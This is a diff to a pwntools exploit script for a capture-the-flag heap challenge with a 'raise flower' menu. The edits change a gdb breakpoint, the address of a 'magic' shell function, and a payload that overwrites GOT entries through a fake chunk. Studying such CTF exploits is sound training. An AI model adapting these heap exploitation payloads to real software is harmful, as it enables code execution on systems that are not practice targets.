@@ -21,7 +21,12 @@ else:
 
 def DEBUG():
     raw_input("DEBUG: ")
-    gdb.attach(io)
+    #  cmd = '''
+    #  b *0x400B74
+    #  c
+    #  '''
+    cmd = "b *add+218\nc"
+    gdb.attach(io, cmd)
 
 def raiseFlower(length, name, color):
     io.sendlineafter("choice : ", "1")
@@ -46,8 +51,8 @@ def clnGarden():
     io.sendlineafter("choice : ", "4")
 
 if __name__ == "__main__":
-    #  shAddr = elf.symbols["magic"]
-    shAddr = 0x400C62
+    shAddr = elf.symbols["magic"]
+    #  shAddr = 0x400C62
     fakeChunk = 0x601ffa
 
     raiseFlower(0x50, "name", "color")
@@ -64,7 +69,7 @@ if __name__ == "__main__":
     raiseFlower(0x50, "name", "color")
     sleep(0.1)
     raiseFlower(0x50, "name", "color")
-    payload = p8(0) * 6 + p64(0) + p64(shAddr) * 2
+    payload = p8(0) * 6 + p64(0) + p64(shAddr) * 2 + p64(0x400796) + p64(shAddr)
 
     sleep(0.1)
     #  DEBUG()
